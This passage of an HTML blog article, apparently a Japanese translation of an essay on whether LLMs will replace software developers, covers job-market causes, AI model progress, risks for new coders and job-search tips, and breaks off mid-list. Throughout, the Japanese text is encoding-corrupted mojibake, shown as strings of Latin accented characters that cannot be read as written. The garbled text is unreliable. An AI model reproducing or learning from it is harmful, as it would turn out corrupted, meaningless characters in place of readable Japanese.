<p>æ„Ÿè¦šçš„ã«ã¯ã€â€ã‚¯ãƒ«ãƒ¼ã‚ºã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«â€ã‚’ä½¿ã£ã¦é«˜é€Ÿé“è·¯ã‚’èµ°ã‚‹ã®ã«è¿‘ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚è»Šã¯æ¦‚ã­é€²è¡Œæ–¹å‘ã«æ²¿ã£ã¦èµ°ã‚Šã¾ã™ãŒã€ãƒ•ãƒ©ãƒ•ãƒ©ã—ãªã„ã‚ˆã†ãƒãƒ³ãƒ‰ãƒ«ã‚’æ¡ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã†ã—ãªã„ã¨ã€è»ŠãŒå¾ã€…ã«è»Šç·šã‹ã‚‰ã¯ã¿å‡ºã—ã¦ã—ã¾ã„ã¾ã™ã€‚æ™‚æŠ˜è»Šç·šå†…ã«æˆ»ã—ã¦ã‚ã’ãªã„ã¨ã€å´æºã«è½ã¡ã¦ã—ã¾ã„ã¾ã™ã€‚</p>
<p><strong>é–‹ç™ºè€…ä¸è¦è«–ã®å•é¡Œç‚¹ã¯ã¾ã•ã«ãã“ã«ã‚ã‚Šã¾ã™</strong>ã€‚ã‚³ãƒ¼ãƒ‰ã®æ›¸ãæ–¹ã‚’çŸ¥ã‚‰ãªã‘ã‚Œã°ã€ãƒ¢ãƒ‡ãƒ«ãŒç”Ÿæˆã—ãŸã‚³ãƒ¼ãƒ‰ã«é‡å¤§ãªå•é¡ŒãŒæ½œã‚“ã§ã„ãŸã¨ã—ã¦ã‚‚ã€æ°—ã¥ãã“ã¨ãŒã§ãã¾ã›ã‚“ã€‚è»Œé“ä¿®æ­£ã®å›³ã‚Šæ–¹ã‚‚ã€è»Œé“ä¿®æ­£ãŒå¿…è¦ã§ã‚ã‚‹ã“ã¨ã‚‚åˆ†ã‹ã‚‰ãªã„ã§ã—ã‚‡ã†ã€‚</p>
<p>LLMã‚’ä½¿ã£ã¦ãƒãƒ¼ã‚³ãƒ¼ãƒ‰ã§ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’æ§‹ç¯‰ã—ãŸäººã®è©±ã‚’èãã¨ã€ã¿ãªåŒæ§˜ã®çµŒé¨“ã‚’ã—ã¦ã„ã¾ã™ã€‚å‡ºã ã—ã¯å¥½èª¿ã§ã‚‚ã€ã‚„ãŒã¦ã©ã†AIã‚’ä¿ƒã—ã¦ã‚‚ã“ã‚Œä»¥ä¸Šã¯é€²ã‚ãªã„ã¨ã„ã†å±€é¢ã«è¡Œãç€ãã¾ã™ã€‚ã‚³ãƒ¼ãƒ‰ã¯ã¡ãã¯ãã§æ··æ²Œã¨ã—ã€ã‚ã‚‹ä¸€å®šã®ç·šã‚’è¶Šãˆã‚‹ã¨ã„ãã‚‰å¿œæ€¥å‡¦ç½®ã‚’æ–½ã—ã¦ã‚‚ç¶­æŒã§ããªããªã‚Šã¾ã™ã€‚ãã†ãªã‚‹ã¨ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ å…¨ä½“ãŒç ´ç¶»ã—ã¦ã—ã¾ã„ã¾ã™ã€‚</p>
<p>ã¾ãŸã€LLMãŒä¸å¾—æ„ãªã‚¿ã‚¹ã‚¯ã‚‚ãŸãã•ã‚“ã‚ã‚Šã¾ã™ã€‚10åˆ†ã‹ã‘ã¦Claudeã«æ„å›³ã‚’ç†è§£ã•ã›ã‚ˆã†ã¨ã™ã‚‹ã‚‚ã§ããšã€è«¦ã‚ã¦è‡ªåˆ†ã§å®Ÿè£…ã—ãŸã‚‰5åˆ†ã§ã§ããŸã¨ã„ã†ã‚ˆã†ãªã‚¹ãƒˆãƒ¬ã‚¹ã®æºœã¾ã‚‹çµŒé¨“ã‚’ã—ãŸã“ã¨ã‚‚ä½•åº¦ã‹ã‚ã‚Šã¾ã™ã€‚æ¬¡ç¬¬ã«ã©ã®ã‚¿ã‚¹ã‚¯ã‚’AIã«ä»»ã›ã€ã©ã®ã‚¿ã‚¹ã‚¯ã¯æ˜”ãªãŒã‚‰ã®æ–¹æ³•ã§å‡¦ç†ã™ã‚‹ã®ãŒã„ã„ã‹ç›´æ„Ÿã§åˆ†ã‹ã‚‹ã‚ˆã†ã«ãªã£ã¦ãã¾ã—ãŸã€‚</p>
<p>ç·åˆã™ã‚‹ã¨ã€LLMã¯ã‹ãªã‚Šã®æ™‚é–“ã‚’ç¯€ç´„ã—ã¦ãã‚Œã¾ã™ã€‚è‡ªåˆ†ã§ã‚„ã‚‹ã¨30åˆ†ã‹ã‹ã‚‹ä½œæ¥­ã‚’LLMãŒ30ç§’ã§çµ‚ã‚ã‚‰ã›ã¦ãã‚ŒãŸã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚ãã†ã„ã†æ™‚ã¯æœ¬å½“ã«çˆ½å¿«ã§ã™ã€‚ã—ã‹ã—ã€å®Ÿéš›ã®ã¨ã“ã‚ã€è‡ªã‚‰ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ã„ã¦ã„ã‚‹æ™‚é–“ã®æ–¹ãŒã¾ã åœ§å€’çš„ã«å¤šã„ã§ã™ã€‚</p>
<p>ãƒ—ãƒ­ãƒ¬ã‚¹ã®ã‚¿ãƒƒã‚°ãƒãƒƒãƒã®ã‚ˆã†ã«ã€ClaudeãŒå¾—æ„ãªã‚¿ã‚¹ã‚¯ã§ã¯ã‚¿ãƒƒãƒã—ã¦äº¤ä»£ã—ã€å‡¦ç†ã—ã¦ã‚‚ã‚‰ã„ã¾ã™ã€‚ã—ã‹ã—ã€ã¾ã è‡ªåˆ†ã§ã‚„ã‚‹ã»ã†ãŒé€Ÿãç°¡å˜ãªã®ã§ã€ã»ã¨ã‚“ã©ã®ã‚³ãƒ¼ãƒ‰ã¯è‡ªåˆ†ãŒæ›¸ã„ã¦ã„ã¾ã™ã€‚</p>
<h2>ç¾åœ¨ã®å°±è·å¸‚å ´</h2>
<p>ä½•å¹´ã‹å‰ã«ã“ã®è¨˜äº‹ã‚’æ›¸ã„ãŸã¨ãã€å°±è·å¸‚å ´ã¯ã‹ãªã‚Šå³ã—ã„çŠ¶æ³ã«ã‚ã‚Šã¾ã—ãŸã€‚æ®‹å¿µãªãŒã‚‰ã€ç¾åœ¨ã‚‚ã¾ã å³ã—ã„çŠ¶æ³ã¯å¤‰ã‚ã£ã¦ã„ã¾ã›ã‚“ã€‚</p>
<p>æ±‚è·ä¸­ã®èª­è€…ã¯ã€ä»¥å‰ã»ã©è³ªã®é«˜ã„æ±‚äººãŒãªãã€è‰¯ã„æ±‚äººã«ã¯å¿œå‹ŸãŒæ®ºåˆ°ã™ã‚‹ã“ã¨ã‚’ã”å­˜çŸ¥ã§ã—ã‚‡ã†ã€‚é¢æ¥ã®æ©Ÿä¼šã‚’å¾—ã‚‹ã®ã‚‚éå¸¸ã«é›£ã—ãã€å†…å®šã‚’ã‚‚ã‚‰ã†ã®ãŒã„ã‹ã«é›£ã—ã„ã‹ã¯è¨€ã†ã¾ã§ã‚‚ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<p>ã—ã‹ã—ã€ã“ã®çŠ¶æ³ã¯ä¼æ¥­ãŒé–‹ç™ºè€…ã‚’è‡ªå¾‹å‹AIã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã«ç½®ãæ›ãˆã¦ã„ã‚‹ã‹ã‚‰ã§ã¯ãªã„ã¨æ€ã„ã¾ã™ã€‚ã™ã§ã«è¿°ã¹ãŸã¨ãŠã‚Šã€ç­†è€…ãŒã“ã‚Œã¾ã§èª­ã‚“ã§ããŸå®Ÿéš›ã®ä½“é¨“è«‡ã¯ãã®ä»®èª¬ã‚’è£ä»˜ã‘ã‚‹ã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã§ã¯ä½•ãŒèµ·ãã¦ã„ã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚ãªãœã“ã‚Œã»ã©å³ã—ã„çŠ¶æ³ãŒç¶šã„ã¦ã„ã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚</p>
<p>ã“ã‚Œã«ã¯ã„ãã¤ã‹ã®è¦å› ãŒçµ¡ã‚“ã§ã„ã‚‹ã¨æ€ã„ã¾ã™ã€‚</p>
<ol>
<li><strong>ãƒã‚¯ãƒ­çµŒæ¸ˆçš„è¦å› </strong>ã€‚é‡‘åˆ©ãŒã¾ã æ¯”è¼ƒçš„é«˜ãã€ã‚¹ã‚¿ãƒ¼ãƒˆã‚¢ãƒƒãƒ—ä¼æ¥­ã¯äº‹æ¥­ã‚’æ‹¡å¤§ã—é–‹ç™ºè€…ã‚’é›‡ã†ã®ã«å¿…è¦ãªè³‡é‡‘ã‚’èª¿é”ã™ã‚‹ã®ãŒé›£ã—ã„çŠ¶æ³ã«ã‚ã‚Šã¾ã™ã€‚ã“ã“æ•°å¹´ã€æ™¯æ°—å¾Œé€€ãŒé–“è¿‘ã«è¿«ã£ã¦ã„ã‚‹ã¨ã„ã†æ™¯æ³æ„ŸãŒç¶šã„ã¦ã„ã¾ã™ã€‚</li>
<li><strong>ãƒ¬ã‚¤ã‚ªãƒ•</strong>ã€‚å¤§æ‰‹ãƒã‚¤ãƒ†ã‚¯ä¼æ¥­ã¯ã€ã“ã“æ•°å¹´ã®é–“ã«æ•°åä¸‡äººã®åŠ´åƒè€…ã‚’ã•ã¾ã–ã¾ãªç†ç”±ã§ä¸€æ™‚çš„ã«è§£é›‡ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã¤ã¾ã‚Šã€å¤šãã®æœ‰èƒ½ãªé–‹ç™ºè€…ãŒä»•äº‹ã‚’æ¢ã—ã¦ã„ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚</li>
<li><strong>AIç¥è©±</strong>ã€‚ä¸€éƒ¨ã®ä¼æ¥­ã¯ã€ã„ã¾ã ã«AIãŒè¿‘ã„å°†æ¥é–‹ç™ºè€…ã‚’ä¸è¦ã«ã™ã‚‹ã¨è€ƒãˆã¦ãŠã‚Šã€ç©æ¥µçš„ãªé›‡ç”¨ã‚’è¡Œã£ã¦ã„ã¾ã›ã‚“ã€‚</li>
</ol>
<p>3ã¤ç›®ã«æŒ™ã’ãŸç‚¹ã«ã¤ã„ã¦ã¯ç‰¹ã«ã‚‚ã©ã‹ã—ã„æ€ã„ãŒã—ã¾ã™ã€‚AGI* ãŒå®Ÿç”¨åŒ–ç›´è¿‘ã§ã‚ã‚Šã€å®Ÿç”¨åŒ–ã•ã‚Œã‚Œã°äººé–“ã®é–‹ç™ºè€…ã¯ä¸€åˆ‡ä¸è¦ã«ãªã‚‹ã¨ä¿¡ã˜ã¦ä¼æ¥­ã¯å¿…è¦ãªé–‹ç™ºè€…ã®é›‡ç”¨ã‚’æ§ãˆã¦ã„ã‚‹ã®ã§ã™ã€‚ã€Œã˜ãã«ãã†ãªã‚Šã¾ã™ã€ã¨è¨€ã„å§‹ã‚ã¦ã‚‚ã†æ•°å¹´ãŒçµŒã¡ã¾ã™ã€‚</p>
<p>*æ±ç”¨äººå·¥çŸ¥èƒ½: äººé–“ã®ã‚ˆã†ã«å­¦ç¿’ãƒ»æ¨è«–ã—ãŸã‚Šã€ã¾ã å­¦ã‚“ã§ã„ãªã„ã“ã¨ã‚‚ã“ãªã™ã“ã¨ãŒã§ãã‚‹AIã€‚</p>
<h2>ä»Šå¾Œã®å±•æœ›</h2>
<p>2023å¹´ã«â€œ<a href="">The End of Front-End Development</a>â€ã‚’åŸ·ç­†ã—ãŸå½“æ™‚ã€ç­†è€…ã¯é–‹ç™ºè€…ã‚’ç›®æŒ‡ã—ã‚­ãƒ£ãƒªã‚¢ã‚’ã‚¹ã‚¿ãƒ¼ãƒˆã•ã›ãŸã°ã‹ã‚Šã§ã€ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’å‹‰å¼·ä¸­ã®èª­è€…ã«ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’å±Šã‘ãŸã„ã¨è€ƒãˆã¦ã„ã¾ã—ãŸã€‚ä¸–é–“ã®è¦‹é€šã—ãŒã‚ã¾ã‚Šã«æš—ã‹ã£ãŸãŸã‚ã€ãƒãƒƒãƒˆä¸Šã«æ¸¦å·»ã FUD* ã‚’å°‘ã—ã§ã‚‚è§£æ¶ˆã—ãŸã„ã¨æ€ã£ã¦ã„ã¾ã—ãŸã€‚</p>
<p>*ä¸å®‰ã‚„æ‡¸å¿µã€ä¸é€æ˜æ„Ÿ</p>
<p>éå»2å¹´é–“ã§ã•ã¾ã–ã¾ãªå¤‰åŒ–ãŒã‚ã‚Šã¾ã—ãŸãŒã€å¤‰ã‚ã£ã¦ã„ãªã„ã“ã¨ãŒ2ã¤ã‚ã‚Šã¾ã™ã€‚</p>
<ol>
<li>ä¼æ¥­ã¯è£½å“ã‚’ä½œã‚‹ãŸã‚ã«ã¾ã äººé–“ã®é–‹ç™ºè€…ã‚’å¿…è¦ã¨ã—ã¦ã„ã¾ã™ã€‚</li>
<li>AIã‚¨ãƒãƒ³ã‚¸ã‚§ãƒªã‚¹ãƒˆã¯ã€ã‚‚ã†ã˜ãä¼æ¥­ã¯è£½å“ã‚’ä½œã‚‹ã®ã«äººé–“ã®é–‹ç™ºè€…ãŒä¸è¦ã«ãªã‚‹ã¨ã„ã¾ã ã«ä¸»å¼µã—ã¦ã„ã¾ã™ã€‚</li>
</ol>
<p>é–‹ç™ºè€…ã‚’ç›®æŒ‡ã—å¤§å­¦ã‚„ãƒ–ãƒ¼ãƒˆã‚­ãƒ£ãƒ³ãƒ—ã€ã¾ãŸã¯ç‹¬å­¦ã§å‹‰å¼·ä¸­ã®èª­è€…ã‚‚ã„ã‚‹ã¨æ€ã„ã¾ã™ãŒã€<strong>çš†ã•ã‚“ãŒå°±è·ã™ã‚‹ãƒãƒ£ãƒ³ã‚¹ã¯ã‚ã‚‹ã¨ç¢ºä¿¡ã—ã¦ã„ã¾ã™</strong>ã€‚ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢é–‹ç™ºãŒå®Œå…¨ã«è‡ªå‹•åŒ–ã•ã‚Œã‚‹ã®ã¯ã¾ã ã‹ãªã‚Šå…ˆã®è©±ã ã¨ã„ã†ã®ã¯æ˜ã‚‰ã‹ã§ã™ã€‚é–‹ç™ºè€…ã®ä»£ã‚ã‚Šã§ã¯ãªãã€é–‹ç™ºè€…ã®ç”Ÿç”£æ€§ã‚’é«˜ã‚ã‚‹ãƒ„ãƒ¼ãƒ«ã¨ã—ã¦AIã‚’æ´»ç”¨ã—ãŸæ–¹ãŒé¥ã‹ã«åŠ¹æœçš„ã§ã‚ã‚‹ã“ã¨ã«ä¼æ¥­ãŒæ°—ã¥ã‘ã°ã€è‡ªã‚‰ã®æˆé•·ã‚’å¦¨ã’ã‚‹ã‚ˆã†ãªè¡Œç‚ºã‚’ã‚„ã‚ã€ã‚ˆã‚Šç©æ¥µçš„ã«é›‡ã†ã‚ˆã†ã«ãªã‚‹ã¨æ€ã„ã¾ã™ã€‚</p>
<p>AIãƒ¢ãƒ‡ãƒ«ã¯é–“é•ã„ãªãæ”¹å–„ã—ç¶šã‘ã‚‹ã§ã—ã‚‡ã†ã€‚æ¯é€±ã®ã‚ˆã†ã«æ–°ã—ã„ãƒ¢ãƒ‡ãƒ«ãŒãƒªãƒªãƒ¼ã‚¹ã•ã‚Œã¦ã¯ãƒ™ãƒ³ãƒãƒãƒ¼ã‚¯ã®è¨˜éŒ²ã‚’æ›´æ–°ã—ã¦ã„ã¾ã™ã€‚æœ€è¿‘ã§ã¯ã€Googleç¤¾ãŒ<a href="https://deepmind.google/technologies/gemini/">Gemini 2.0 Flashã¨2.5 Pro</a>ãƒ¢ãƒ‡ãƒ«ã‚’ç™ºè¡¨ã—ã¾ã—ãŸã€‚</p>
<p><img src="https://www.joshwcomeau.com/images/the-post-developer-era/chart-speed.png"></p>
<p><img src="https://www.joshwcomeau.com/images/the-post-developer-era/chart-intelligence.png">
å‡ºå…¸ï¼š<a href="https://artificialanalysis.ai/">Artificial Analysis</a></p>
<p>ãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼ã¯é€²åŒ–ã®æ›²ç·šãŒã‚ˆã‚Šç·©ã‚„ã‹ã«ãªã‚‹ãƒã‚¤ãƒ³ãƒˆã«é”ã—ãŸã‚ˆã†ã«ç­†è€…ã¯æ„Ÿã˜ã¦ã„ã¾ã™ã€‚ã‚²ãƒ¼ãƒ ãƒã‚§ãƒ³ã‚¸ãƒ£ãƒ¼ã¨å‘¼ã¹ã‚‹ã‚ˆã†ãªç™ºè¡¨ã¯ã—ã°ã‚‰ãå‡ºã¦ã„ã¾ã›ã‚“ã€‚æ–°ãŸã«å‡ºã¦ãã‚‹ãƒ¢ãƒ‡ãƒ«ã¯å°‘ã—ãšã¤æ”¹è‰¯ã•ã‚Œã¦ã¯ã„ã¾ã™ãŒã€å…¨ãæ–°ã—ã„èª²é¡Œã‚’è§£æ±ºã™ã‚‹ã¨ã„ã†ã‚ˆã‚Šã€ã™ã§ã«å„ªã‚Œã¦ã„ã‚‹ç‚¹ã‚’ã•ã‚‰ã«å‘ä¸Šã•ã›ã‚‹ã‚‚ã®ã§ã™ã€‚</p>
<p>ç¾åœ¨ã®å°±è·å¸‚å ´ã¯è¦‹é€šã—ãŒå³ã—ã„ã¨æ„Ÿã˜ã¾ã™ãŒã€å°‘ãªãã¨ã‚‚ç±³å›½ã§ã¯æ­£ã—ã„æ–¹å‘ã«é€²ã‚“ã§ã„ã¾ã™ã€‚</p>
<p><img src="https://www.joshwcomeau.com/images/the-post-developer-era/yoy-graph.jpg">
å‡ºå…¸ï¼š<a href="https://bsky.app/profile/josephpolitano.bsky.social/post/3ljs5yzcg3c2k">Joey Politano</a>ã®ãƒ©ãƒ–ãƒªãƒ¼ãªã‚°ãƒ©ãƒ•ï¼</p>
<p>AIã«ã‚ˆã£ã¦æœ¬å½“ã«ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢é–‹ç™ºè€…ãŒä¸è¦ã«ãªã£ã¦ã„ã‚‹ã®ã§ã‚ã‚Œã°ã€ãƒã‚¤ãƒ†ã‚¯ç³»ã®é›‡ç”¨æ•°ã¯æ€¥é€Ÿã«æ¸›å°‘ã—ã¦ã„ã‚‹ã¯ãšã ã¨æ€ã„ã¾ã™ãŒã€ã“ã®1å¹´ã®é›‡ç”¨æ•°ã¯å¢—ãˆã¦ã„ã¾ã™ã€‚ã“ã®å‚¾å‘ãŒç¶šã‘ã°ã€è¿‘ã„å°†æ¥å¸‚å ´ã®è¦‹é€šã—ã¯ã‹ãªã‚Šæ˜ã‚‹ããªã‚‹ã§ã—ã‚‡ã†ã€‚</p>
<h2>æ‡¸å¿µç‚¹</h2>
<p>2023å¹´ã®æ™‚ç‚¹ã§ã€AIãŒã™ãã«ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢é–‹ç™ºè€…ã®ä»•äº‹ã‚’å¥ªã†ã“ã¨ã«ã¯ãªã‚‰ãªã„ã¨ã„ã†è‡ªä¿¡ãŒãã‚Œãªã‚Šã«ã‚ã‚Šã¾ã—ãŸã€‚ãã‚Œã‹ã‚‰2å¹´ãŒçµŒã¡ã€ãã®è‡ªä¿¡ã¯ä¸€å±¤æ·±ã¾ã‚Šã¾ã—ãŸã€‚ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã¯ä¾ç„¶ã¨ã—ã¦æ¥µã‚ã¦è²´é‡ãªã‚¹ã‚­ãƒ«ã§ã‚ã‚Šã€ãã‚ŒãŒã™ãã«å¤‰ã‚ã‚‹ã¨ã¯æ€ãˆã¾ã›ã‚“ã€‚</p>
<p>ã¨ã¯è¨€ãˆã€ä½•ã‚‚ã‹ã‚‚é †èª¿ã§èª°ã‚‚å¿ƒé…ã™ã‚‹å¿…è¦ã¯ãªã„ã¨è¨€ã£ã¦ã„ã‚‹ã‚ã‘ã§ã‚‚ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<p>æ˜¨ä»Šã®ä¸–ç•Œæƒ…å‹¢ã¯ã€çµŒæ¸ˆã‚’ã¯ã˜ã‚ã€ã‚ã‚‰ã‚†ã‚‹é¢ã§åºƒç¯„ãªå½±éŸ¿ã¨ä¸ç¢ºå®Ÿæ€§ã‚’ã‚‚ãŸã‚‰ã—ã¦ã„ã‚‹ã‚ˆã†ã«æ€ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ãŒãƒã‚¤ãƒ†ã‚¯æ¥­ç•Œã«ä¸ãˆã‚‹å½±éŸ¿ã«ã¤ã„ã¦ã¯äºˆæ¸¬ãŒé›£ã—ã„ã‚‚ã®ã®ã€ç§ã¨ã—ã¦ã¯æŒ‘æˆ¦çš„ãªæ™‚æœŸã¨ãªã‚‹ã®ã§ã¯ãªã„ã‹ã¨è€ƒãˆã¦ã„ã¾ã™ã€‚</p>
<p>æ¬¡ã®ä¸–ä»£ã®é–‹ç™ºè€…ã«ã¤ã„ã¦å°‘ã—å¿ƒé…ã—ã¦ã„ã¾ã™ã€‚LLMã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚’ä½¿ã£ã¦ã„ã‚‹ã¨ãƒˆãƒ©ãƒ³ã‚¹çŠ¶æ…‹ã«é™¥ã‚Šã€ç”Ÿæˆã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã‚’ç†è§£ã—ãªã„ã¾ã¾ã€ã‚ã‚‹ã„ã¯è¦‹ã‚‹ã“ã¨ã•ãˆã—ãªã„ã¾ã¾ã€æ©Ÿæ¢°çš„ã«å¤‰æ›´ã‚’å—ã‘å…¥ã‚Œã‚‹ã‚ˆã†ã«ãªã‚ŠãŒã¡ã§ã™ã€‚<sup id="fnref-1"><a href="#fn-1" class="footnote-ref">1</a></sup>ç­†è€…ã‚‚ã€<a href="https://whimsy.joshwcomeau.com/">æ–°ã—ã„ã‚³ãƒ¼ã‚¹ã®ãƒ©ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ãƒšãƒ¼ã‚¸</a>ã‚’ãƒ“ãƒ«ãƒ‰ã—ã¦ã„ã‚‹éš›ã«ãã®ç½ ã«ã¯ã¾ã‚Šãã†ã«ãªã£ã¦ã„ã‚‹ã“ã¨ã«æ°—ã¥ãã¾ã—ãŸã€‚ãƒãƒ³ãƒ‰ãƒ«ã‹ã‚‰é•·ãæ‰‹ã‚’é›¢ã—éãã¦ã—ã¾ã£ãŸãŸã‚ã€å¥‡å¦™ãªã‚¸ãƒ£ãƒ³ã‚¯ã‚³ãƒ¼ãƒ‰ã®ãƒªãƒ•ã‚¡ã‚¯ã‚¿ãƒªãƒ³ã‚°ã«å¤šãã®æ™‚é–“ã‚’è²»ã‚„ã™ã¯ã‚ã«ãªã‚Šã¾ã—ãŸã€‚</p>
<p>æœ€ã‚‚æ¥½ãªé“ã¯ã€ä½•ã‚‚ã›ãšæ©Ÿæ¢°ã«ä»»ã›ã‚‹ã“ã¨ã§ã™ãŒã€ãã†ã™ã‚‹ã¨æ©Ÿæ¢°ãŒè¡Œãè©°ã¾ã£ãŸã¨ãã«ã‚³ãƒ¼ãƒ‰ã‚’ä¿®æ­£ã—ãŸã‚Šã€ãƒ‡ãƒãƒƒã‚°ã—ãŸã‚Šã™ã‚‹ã®ã«å¿…è¦ãªã‚¹ã‚­ãƒ«ãŒèº«ã«ã¤ãã¾ã›ã‚“ã€‚</p>
<p>ä¸€æ–¹ã§ã€LLMã‚’ç©æ¥µçš„ã«åˆ©ç”¨ã™ã‚‹ã®ã§ã‚ã‚Œã°ã€ä»ŠãŒã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’å­¦ã¶çµ¶å¥½ã®æ©Ÿä¼šã§ã™ã€‚ç­†è€…ã®å ´åˆã€ã‚ˆãåˆ†ã‹ã‚‰ãªã„TypeScriptã‚¨ãƒ©ãƒ¼ãŒå‡ºãŸã¨ãã«ã€AIãŒç†è§£ã‚’åŠ©ã‘ã¦ãã‚ŒãŸã‚Šã€é©åˆ‡ãªè³‡æ–™ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«å¿…è¦ãªã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’ç¤ºã—ã¦ãã‚ŒãŸã‚Šã™ã‚‹ã“ã¨ãŒå¤šã€…ã‚ã‚Šã¾ã™ã€‚ã¾ã‚‹ã§è‡ªåˆ†ã ã‘ã®å€‹äººè¬›å¸«ãŒä¸æ˜ç‚¹ã‚’ç†è§£ã™ã‚‹æ‰‹åŠ©ã‘ã‚’ã—ã¦ãã‚Œã¦ã„ã‚‹ã‚ˆã†ãªæ„Ÿè¦šã§ã™ã€‚<sup id="fnref-2"><a href="#fn-2" class="footnote-ref">2</a></sup></p>
<p>ä»Šå¾Œæ•°å¹´é–“ãŒã©ã†ãªã‚‹ã‹ã¯èª°ã«ã‚‚åˆ†ã‹ã‚Šã¾ã›ã‚“ãŒã€1ã€2å¹´å¾Œã«ä¼æ¥­ãŒã‚ˆã†ã‚„ãäººé–“ã®é–‹ç™ºè€…ãŒã¾ã å¿…è¦ã§ã‚ã‚‹ã“ã¨ã‚’å—ã‘å…¥ã‚Œã€ç†Ÿç·´ã—ãŸäººé–“ãŒå¼·åŠ›ãªLLMã‚’ä½¿ã†ã“ã¨ã§é©šãã¹ãã“ã¨ã‚’æˆã—é‚ã’ã‚‰ã‚Œã‚‹ã“ã¨ã«æ°—ã¥ãã€ã¡ã‚‡ã£ã¨ã—ãŸã€Œé–‹ç™ºè€…ãƒ«ãƒã‚µãƒ³ã‚¹ã€ãŒèµ·ãã¦ã‚‚é©šãã¾ã›ã‚“ã€‚âœ¨</p>
<p>ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢é–‹ç™ºã«æƒ…ç†±ã‚’æŒã¡ã€ã“ã®ä»•äº‹ãŒé«˜ã„çµ¦æ–™ã‚’ç¨¼ã„ã§ã‚¢ãƒƒãƒ‘ãƒ¼ãƒŸãƒ‰ãƒ«ã‚¯ãƒ©ã‚¹ã®æš®ã‚‰ã—ã‚’æ‰‹ã«å…¥ã‚Œã‚‰ã‚Œã‚‹è¦‹è¾¼ã¿ãŒæœ€ã‚‚ã‚ã‚Šãã†ã ã¨è€ƒãˆã¦ã„ã‚‹ã®ã§ã‚ã‚Œã°ã€AIã®èª‡å¤§å®£ä¼ã«æƒ‘ã‚ã•ã‚Œã€è‡ªä¿¡ã‚’å¤±ã‚ãªã„ã§ã„ãŸã ããŸã„ã¨æ€ã„ã¾ã™ã€‚ä¼æ¥­ã¯ä»Šã‚‚é›‡ç”¨ã—ç¶šã‘ã¦ã„ã¾ã™ã—ã€ãã‚Œã¯å½“åˆ†å¤‰ã‚ã‚‰ãªã„ã¨æ€ã„ã¾ã™ã€‚ğŸ’–</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><h2>å°±è·æ´»å‹•ã®ãƒ’ãƒ³ãƒˆ</h2><p>ç¾åœ¨ã®å°±è·å¸‚å ´ã§ä»•äº‹ã‚’å‹ã¡å–ã‚‹ãƒãƒ£ãƒ³ã‚¹ã‚’æœ€å¤§é™ã«é«˜ã‚ã‚‹æ–¹æ³•ã«ã¤ã„ã¦è©±ã—ãŸã„ã¨æ€ã„ã¾ã™ã€‚</p><p>æœ€åˆã«ç†è§£ã—ã¦ãŠãã¹ãã“ã¨ã¯ã€AIã®ç™»å ´ã«ã‚ˆã‚Šä¼æ¥­ã®é›‡ç”¨ãƒ—ãƒ­ã‚»ã‚¹ãŒæ‚²æƒ¨ãªã‚‚ã®ã«ãªã£ã¦ã„ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚æ±‚äººã‚’å‡ºã™ã¨ã€AIãŒç”Ÿæˆã—ãŸè³ªã®ä½ã„å¿œå‹Ÿæ›¸é¡ãŒä½•åƒé€šã‚‚å±Šãå ´åˆãŒã‚ã‚Šã€æ¡ç”¨æ‹…å½“è€…ã«ã¨ã£ã¦ã‚‚ã™ã¹ã¦ã®æ›¸é¡ã«ç›®ã‚’é€šã™ã®ã¯å›°é›£ã§ã™ã€‚æ±‚äººã«å¿œå‹Ÿã—ã¦ã‚‚ã€ä»–ã®å¿œå‹Ÿæ›¸é¡ã®å±±ã«åŸ‹ã‚‚ã‚Œã¦ã—ã¾ã†å¯èƒ½æ€§ãŒé«˜ã„ã§ã—ã‚‡ã†ã€‚</p><p>ã“ã®çŠ¶æ³ã«å¯¾ã™ã‚‹è§£æ±ºç­–ã¯2ã¤ã‚ã‚Šã¾ã™ã€‚</p><ul>
<li>æ±‚äººãŒå‡ºã¦ã‹ã‚‰æ•°æ—¥ä»¥å†…ã®æ—©ã„æ®µéšã§å¿œå‹Ÿã™ã‚‹ã€‚</li>
<li>ã‚³ãƒã‚’é ¼ã‚‹ã€‚</li>
